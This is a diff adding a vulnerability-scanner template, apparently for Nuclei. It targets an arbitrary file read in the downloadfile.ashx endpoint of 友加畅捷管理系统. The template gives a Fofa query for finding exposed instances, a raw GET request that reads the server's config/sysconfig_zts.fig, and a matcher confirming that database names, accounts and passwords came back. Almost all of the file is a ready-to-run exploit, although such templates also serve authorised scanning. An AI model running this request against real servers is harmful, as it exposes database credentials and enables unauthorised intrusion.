@@ -1,0 +1,31 @@
+id: YouJiaChangJieGuanLiXiTong-downloadfile_ashx-File-Reading
+
+info:
+  name: 友加畅捷管理系统 downloadfile.ashx 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    Fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
+    该系统的 downloadfile.ashx 接口存在任意文件读取漏洞。攻击者可利用此漏洞，未经授权地读取服务器上的任意文件，包括但不限于系统配置文件和数据库配置文件等敏感信息。 成功利用此漏洞可能导致企业内部敏感数据泄露，对系统的机密性和完整性构成潜在威胁。
+  reference: |
+    -
+  tags: File Reading
+  
+http:
+  - raw:
+      - |-
+        GET /Controllers/ajax/downloadfile.ashx?fileurl=config/sysconfig_zts.fig HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: keep-alive
+        Priority: u=4
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'DBName','ZTName','account','pwd')"
